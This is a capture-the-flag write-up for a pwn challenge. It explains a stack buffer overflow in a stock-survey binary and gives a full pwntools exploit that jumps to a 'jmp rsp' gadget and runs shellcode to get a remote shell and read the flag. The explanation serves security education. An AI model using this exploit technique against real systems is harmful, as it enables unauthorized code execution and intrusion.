# Brunner Stocks

- Category: pwn
- Difficulty: Easy-Medium
- Author: Vincent

Brunnerne Inc.'s automated stock trading algorithm asks a short investment-preferences survey before trading for you.

### Solution:

##### 1. Spot the bug in the source

We're given the binary, `stocks.c`, and the `Dockerfile`. Two things stand out immediately:

```c
float askf(char *prompt) {
    printf("%s (0.0-100.0): ", prompt);
    char buf[0x10];
    fgets(buf, 0x100, stdin);   // buf is 16 bytes, but fgets is told 256
    return atof(buf);
}

void gadget() {
    __asm__("jmp %rsp; ret;");   // never called anywhere
}
```

`askf()` declares a 16-byte buffer but tells `fgets` the destination is 256 bytes — a size-mismatch stack overflow. `gadget()` is dead code containing a raw `jmp rsp`, clearly hand-placed by the author as a pivot.

##### 2. Check binary protections

```
$ checksec --file=stocks
Stack:      No canary found
NX:         NX enabled on new kernels
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
```

No canary and no PIE make the overflow trivial to weaponize, and the stack is executable. That last part isn't a build mistake — `main()` defines `ai_alg`/`real_alg` as GCC nested functions, and GCC implements those on x86-64 with runtime trampolines assembled directly onto the stack, which forces the whole binary to link with an executable stack. That's exactly the primitive `gadget()` relies on.

##### 3. Find the offset

`askf()` disassembly:

```asm
4011aa: sub    rsp,0x20
4011cf: lea    rax,[rbp-0x10]      ; &buf
4011d3: mov    esi,0x100          ; size = 0x100  <-- bug
4011db: call   401070 <fgets@plt>
```

`buf` sits at `[rbp-0x10]`. Offset to the saved return address = `0x10` (buf) + `0x8` (saved rbp) = **24 bytes**. `askf()` is also the very first thing `main()` calls, so we can hijack control flow before any other logic runs.

##### 4. Line up the pivot

`gadget()` disassembly:

```asm
401593: push   rbp
401594: mov    rbp,rsp
401597: jmp    rsp        ; <-- want to land here
401599: ret
```

Targeting `0x401593` would execute `push rbp` first, shifting `rsp` by 8 and corrupting the very spot we're jumping into. Targeting **`0x401597`** directly skips the prologue: when `askf()`'s `ret` pops our fake return address, `rsp` points straight at whatever bytes follow it in our input — `jmp rsp` lands right on our shellcode.

##### 5. Exploit

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.binary = elf = ELF("./stocks")

HOST = "brunner-stocks-38a14ea4c31e755c-global.challs.brunnerne.xyz"
PORT = 1337

OFFSET = 24                 # buf(0x10) + saved rbp(8) -> return address
JMP_RSP = 0x401597          # "jmp rsp" inside gadget(), skipping its prologue

def exploit(io):
    shellcode = asm(shellcraft.sh())
    payload = flat(
        b"A" * OFFSET,
        p64(JMP_RSP),
        shellcode,
    )
    io.sendlineafter(b": ", payload)
    io.interactive()

if __name__ == "__main__":
    io = remote(HOST, PORT, ssl=True) if len(sys.argv) > 1 and sys.argv[1] == "remote" else process("./stocks")
    exploit(io)
```

```
$ python3 exploit.py remote
[+] Opening connection to brunner-stocks-38a14ea4c31e755c-global.challs.brunnerne.xyz on port 1337: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
brunner{shellcoding_for_the_win}
```

No canary to guess, no PIE to leak — just the size-mismatch overflow plus the author's own `jmp rsp` gadget, entered mid-function to dodge its clobbering prologue.

**Flag:** `brunner{shellcoding_for_the_win}`
